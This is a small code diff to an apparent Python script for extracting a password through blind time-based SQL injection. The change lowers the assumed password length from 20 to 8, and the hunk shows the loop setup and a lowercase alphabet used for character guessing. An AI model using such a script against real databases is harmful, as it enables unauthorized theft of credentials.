@@ -21,7 +21,7 @@ def get_password_with_blind_timed_based_SQLi():
     indice = 1 #use to change the indice of the password 
     liste = [] #list all the found character 
     success = True 
-    while indice <= 20: #we assume that the password have 20 character
+    while indice <= 8: #we assume that the password have 8 character
         if success: #initialisation of all variable used during the process
             letter = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']    
             low_bound = 0
